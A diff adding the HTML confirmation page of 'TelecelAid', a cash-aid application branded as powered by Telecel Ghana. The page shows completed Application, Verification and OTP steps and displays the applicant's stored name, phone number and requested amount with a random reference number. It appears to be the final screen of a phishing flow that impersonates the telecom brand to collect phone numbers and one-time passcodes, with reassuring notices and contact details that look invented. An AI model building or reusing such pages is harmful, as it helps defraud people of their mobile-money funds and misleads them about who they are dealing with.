@@ -1,0 +1,514 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Application Submitted - TelecelAid | Powered by Telecel Ghana</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Poppins', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: linear-gradient(135deg, #f8f9fa 0%, #fff 100%);
+            color: #333;
+            line-height: 1.6;
+        }
+
+        :root {
+            --telecel-red: #E2001A;
+            --telecel-red-dark: #B80015;
+            --telecel-red-light: #FFE5E8;
+            --dark: #1a1a2e;
+            --gray: #6c757d;
+            --light-gray: #f8f9fa;
+            --border: #e9ecef;
+            --success: #00875A;
+            --success-light: #E8F5E9;
+            --shadow: 0 10px 40px rgba(0,0,0,0.08);
+            --shadow-sm: 0 2px 8px rgba(0,0,0,0.05);
+        }
+
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap');
+
+        .container {
+            max-width: 700px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+
+        /* Header */
+        .header {
+            text-align: center;
+            margin-bottom: 2rem;
+        }
+
+        .logo-icon {
+            background: var(--telecel-red);
+            color: white;
+            width: 60px;
+            height: 60px;
+            border-radius: 15px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2rem;
+            font-weight: bold;
+            margin-bottom: 1rem;
+        }
+
+        .logo-text {
+            font-size: 1.8rem;
+            font-weight: 800;
+            color: var(--dark);
+        }
+
+        .logo-text span {
+            color: var(--telecel-red);
+        }
+
+        .powered {
+            font-size: 0.8rem;
+            color: var(--gray);
+        }
+
+        /* Progress Bar */
+        .progress-container {
+            margin: 2rem 0;
+        }
+
+        .progress-steps {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 0.5rem;
+        }
+
+        .step-indicator {
+            text-align: center;
+            flex: 1;
+            font-size: 0.75rem;
+            color: var(--gray);
+        }
+
+        .step-indicator.completed {
+            color: var(--success);
+        }
+
+        .progress-bar {
+            background: var(--border);
+            height: 8px;
+            border-radius: 10px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            background: var(--success);
+            height: 100%;
+            width: 100%;
+            border-radius: 10px;
+            transition: width 0.3s;
+        }
+
+        /* Success Card */
+        .success-card {
+            background: white;
+            border-radius: 24px;
+            padding: 2rem;
+            box-shadow: var(--shadow);
+            margin-bottom: 2rem;
+            text-align: center;
+        }
+
+        /* Success Icon */
+        .success-icon {
+            width: 80px;
+            height: 80px;
+            background: var(--success-light);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 1.5rem;
+        }
+
+        .success-icon span {
+            font-size: 3rem;
+        }
+
+        .success-title {
+            font-size: 1.8rem;
+            color: var(--success);
+            margin-bottom: 0.5rem;
+        }
+
+        .success-message {
+            color: var(--gray);
+            margin-bottom: 2rem;
+        }
+
+        /* Application Summary */
+        .summary-section {
+            background: var(--light-gray);
+            border-radius: 16px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+            text-align: left;
+        }
+
+        .summary-title {
+            font-weight: 600;
+            margin-bottom: 1rem;
+            color: var(--dark);
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .summary-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1rem;
+        }
+
+        .summary-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 0.5rem 0;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .summary-label {
+            font-weight: 500;
+            color: var(--gray);
+        }
+
+        .summary-value {
+            font-weight: 600;
+            color: var(--dark);
+        }
+
+        .ref-number {
+            background: white;
+            border-radius: 12px;
+            padding: 1rem;
+            text-align: center;
+            margin: 1rem 0;
+            border: 2px dashed var(--telecel-red);
+        }
+
+        .ref-label {
+            font-size: 0.8rem;
+            color: var(--gray);
+            letter-spacing: 1px;
+        }
+
+        .ref-code {
+            font-size: 1.3rem;
+            font-weight: 700;
+            color: var(--telecel-red);
+            letter-spacing: 2px;
+            margin-top: 0.3rem;
+        }
+
+        /* Next Steps */
+        .next-steps {
+            background: var(--telecel-red-light);
+            border-radius: 16px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+            text-align: left;
+        }
+
+        .next-steps h3 {
+            color: var(--telecel-red);
+            margin-bottom: 1rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .step-list {
+            list-style: none;
+        }
+
+        .step-list li {
+            padding: 0.6rem 0;
+            display: flex;
+            align-items: center;
+            gap: 0.8rem;
+            border-bottom: 1px solid rgba(226,0,26,0.1);
+        }
+
+        .step-list li:last-child {
+            border-bottom: none;
+        }
+
+        .step-number {
+            width: 28px;
+            height: 28px;
+            background: var(--telecel-red);
+            color: white;
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.8rem;
+            font-weight: bold;
+        }
+
+        /* Important Notice */
+        .important-notice {
+            background: #FFF3E0;
+            border-left: 4px solid #FFC107;
+            padding: 1rem;
+            border-radius: 12px;
+            margin: 1.5rem 0;
+            text-align: left;
+            font-size: 0.85rem;
+        }
+
+        /* Buttons */
+        .btn-home {
+            display: inline-block;
+            background: var(--telecel-red);
+            color: white;
+            padding: 1rem 2rem;
+            border-radius: 50px;
+            text-decoration: none;
+            font-weight: 600;
+            transition: all 0.3s;
+            margin: 0.5rem;
+            border: none;
+            cursor: pointer;
+        }
+
+        .btn-home:hover {
+            background: var(--telecel-red-dark);
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(226,0,26,0.3);
+        }
+
+        .btn-print {
+            display: inline-block;
+            background: white;
+            color: var(--telecel-red);
+            padding: 1rem 2rem;
+            border-radius: 50px;
+            text-decoration: none;
+            font-weight: 600;
+            transition: all 0.3s;
+            margin: 0.5rem;
+            border: 2px solid var(--telecel-red);
+            cursor: pointer;
+        }
+
+        .btn-print:hover {
+            background: var(--telecel-red-light);
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            padding: 2rem;
+            border-top: 1px solid var(--border);
+            color: var(--gray);
+            font-size: 0.8rem;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 1rem;
+            }
+            .success-card {
+                padding: 1.5rem;
+            }
+            .summary-grid {
+                grid-template-columns: 1fr;
+            }
+            .btn-home, .btn-print {
+                display: block;
+                margin: 0.5rem 0;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <div class="logo-icon">📱</div>
+            <div class="logo-text">Telecel<span>Aid</span></div>
+            <div class="powered">Powered by Telecel Ghana</div>
+        </div>
+
+        <!-- Progress Bar -->
+        <div class="progress-container">
+            <div class="progress-steps">
+                <div class="step-indicator completed">✓ Step 1<br>Application</div>
+                <div class="step-indicator completed">✓ Step 2<br>Verification</div>
+                <div class="step-indicator completed">✓ Step 3<br>OTP</div>
+                <div class="step-indicator completed">✓ Step 4<br>Complete</div>
+            </div>
+            <div class="progress-bar">
+                <div class="progress-fill"></div>
+            </div>
+        </div>
+
+        <!-- Success Card -->
+        <div class="success-card">
+            <div class="success-icon">
+                <span>✅</span>
+            </div>
+            <h1 class="success-title">Application Submitted!</h1>
+            <p class="success-message">Your TelecelAid application has been successfully received and is now under review.</p>
+
+            <!-- Reference Number -->
+            <div class="ref-number">
+                <div class="ref-label">YOUR APPLICATION REFERENCE NUMBER</div>
+                <div class="ref-code" id="referenceNumber">TEL-2026-XXXX</div>
+                <div style="font-size: 0.7rem; color: var(--gray); margin-top: 0.5rem;">Please save this number for future reference</div>
+            </div>
+
+            <!-- Application Summary -->
+            <div class="summary-section">
+                <div class="summary-title">
+                    📋 Application Summary
+                </div>
+                <div class="summary-grid">
+                    <div class="summary-item">
+                        <span class="summary-label">Full Name</span>
+                        <span class="summary-value" id="summaryName">-</span>
+                    </div>
+                    <div class="summary-item">
+                        <span class="summary-label">Telecel Number</span>
+                        <span class="summary-value" id="summaryPhone">-</span>
+                    </div>
+                    <div class="summary-item">
+                        <span class="summary-label">Region</span>
+                        <span class="summary-value" id="summaryRegion">-</span>
+                    </div>
+                    <div class="summary-item">
+                        <span class="summary-label">Reason for Aid</span>
+                        <span class="summary-value" id="summaryReason">-</span>
+                    </div>
+                    <div class="summary-item">
+                        <span class="summary-label">Amount Requested</span>
+                        <span class="summary-value" id="summaryAmount">-</span>
+                    </div>
+                    <div class="summary-item">
+                        <span class="summary-label">Application Date</span>
+                        <span class="summary-value" id="summaryDate">-</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Next Steps -->
+            <div class="next-steps">
+                <h3>
+                    <span>📌</span> What happens next?
+                </h3>
+                <ul class="step-list">
+                    <li>
+                        <span class="step-number">1</span>
+                        <span>Telecel will review your application within 5-7 business days</span>
+                    </li>
+                    <li>
+                        <span class="step-number">2</span>
+                        <span>You will receive an SMS notification about the status of your application</span>
+                    </li>
+                    <li>
+                        <span class="step-number">3</span>
+                        <span>If approved, funds will be sent directly to your Telecel Cash wallet</span>
+                    </li>
+                    <li>
+                        <span class="step-number">4</span>
+                        <span>You will receive a confirmation SMS when the transfer is complete</span>
+                    </li>
+                </ul>
+            </div>
+
+            <!-- Important Notice -->
+            <div class="important-notice">
+                <strong>⚠️ Important Information</strong><br><br>
+                • TelecelAid never asks for your mobile money PIN. Do not share it with anyone.<br><br>
+                • Keep your reference number safe. You will need it to check your application status.<br><br>
+                • If you don't receive an update within 7 business days, please contact our support team.
+            </div>
+
+            <!-- Action Buttons -->
+            <div>
+                <a href="index.html" class="btn-home">🏠 Return to Home</a>
+                <button onclick="window.print()" class="btn-print">🖨️ Print / Save this Page</button>
+            </div>
+        </div>
+
+        <div class="footer">
+            © 2026 TelecelAid | Powered by Telecel Ghana<br>
+            Need help? Call us: 0800 123 456 | Email: support@telecelaid.com.gh
+        </div>
+    </div>
+
+    <script>
+        // Load data from sessionStorage
+        const savedData = JSON.parse(sessionStorage.getItem('telecelAidApplication'));
+
+        // Check if data exists, if not redirect to apply page
+        if (!savedData) {
+            window.location.href = 'apply.html';
+        }
+
+        // Generate reference number
+        function generateReferenceNumber() {
+            const date = new Date();
+            const year = date.getFullYear();
+            const random = Math.floor(Math.random() * 10000).toString().padStart(4, '0');
+            const ref = `TEL-${year}-${random}`;
+            return ref;
+        }
+
+        // Format date
+        function formatDate() {
+            const date = new Date();
+            return date.toLocaleDateString('en-GH', {
+                year: 'numeric',
+                month: 'long',
+                day: 'numeric',
+                hour: '2-digit',
+                minute: '2-digit'
+            });
+        }
+
+        // Format amount
+        function formatAmount(amount) {
+            return `GHS ${parseInt(amount).toLocaleString()}.00`;
+        }
+
+        // Display summary information
+        function displaySummary() {
+            // Generate and display reference number
+            const referenceNumber = generateReferenceNumber();
+            document.getElementById('referenceNumber').innerText = referenceNumber;
+            
+            // Store reference in sessionStorage
+            savedData.referenceNumber = referenceNumber;
+            savedData.applicationDate = formatDate();
+            sessionStorage.setItem('telecelAidApplication', JSON.stringify(savedData));
+            
+            // Display all fields
+            document.getElementById('summaryName').innerText = savedData.fullName || savedData.confirmedName || '-';
+            document.getElementById('summaryPhone').innerText = savedData.phoneNumber || savedData.confirmedPhone || '-';
+            document.getElementById('summaryRegion').innerText = savedData.region || '-';
+            document.getElementById('summaryReason').innerText = savedData.reason || '-';
+            document.getElementById('summaryAmount').innerText = formatAmount(savedData.amount);
+            document.getElementById('summaryDate').innerText = savedData.applicationDate || formatDate();
+        }
+
+        // Initialize page
+        displaySummary();
+    </script>
+</body>
+</html>
